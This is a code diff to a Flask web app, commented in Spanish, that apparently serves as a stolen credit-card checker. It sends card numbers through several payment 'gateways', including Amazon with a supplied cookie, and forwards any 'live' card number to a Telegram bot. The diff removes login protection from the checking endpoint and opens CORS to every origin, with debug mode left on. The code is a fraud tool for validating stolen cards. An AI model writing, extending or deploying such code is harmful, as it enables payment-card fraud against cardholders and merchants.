@@ -9,7 +9,9 @@ import tec, red, em, amazon
 
 app = Flask(__name__)
 app.secret_key = 'tu_secreto_super_seguro'  # Cambiar a algo fuerte y secreto
-CORS(app)
+
+# CORS abierto a cualquier origen (público)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 # Configuración base de datos SQLite
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
@@ -113,37 +115,40 @@ def enviar_telegram(mensaje):
         'text': mensaje,
         'parse_mode': 'Markdown'
     }
-    req.post(url, data=data)
+    try:
+        req.post(url, data=data)
+    except Exception as e:
+        print(f"Error enviando Telegram: {e}")
 
-# Endpoint para check tarjetas (protegido)
+# Endpoint para check tarjetas (PÚBLICO, sin sesión)
 @app.route('/check', methods=['POST'])
 async def check_card():
-    if 'user_id' not in session:
-        return jsonify({'status': 'error', 'message': 'No autorizado'}), 401
-
     data = request.get_json()
     cc = data.get('cc')
     gateway = data.get('gateway', 'TEC')
     cookie = data.get('cookie', '')
 
-    if gateway == 'TEC':
-        result = await tec.process_card(cc)
-    elif gateway == 'RED':
-        result = await red.process_card(cc)
-    elif gateway == 'EM':
-        result = await em.process_card(cc)
-    elif gateway == 'AMAZON':
-        result = amazon.procesar_tarjeta_amazon(cc, cookie)  # Síncrono
-    else:
-        result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
+    try:
+        if gateway == 'TEC':
+            result = await tec.process_card(cc)
+        elif gateway == 'RED':
+            result = await red.process_card(cc)
+        elif gateway == 'EM':
+            result = await em.process_card(cc)
+        elif gateway == 'AMAZON':
+            result = amazon.procesar_tarjeta_amazon(cc, cookie)  # Síncrono
+        else:
+            result = {'status': 'error', 'message': 'Gateway no válido', 'cc': cc}
 
-    if result['status'] == 'live':
-        mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
-        enviar_telegram(mensaje_telegram)
+        if result['status'] == 'live':
+            mensaje_telegram = f"✅ *LIVE* - {result['cc']}\n{result['message']}"
+            enviar_telegram(mensaje_telegram)
 
-    return jsonify(result)
+        return jsonify(result)
+
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
-
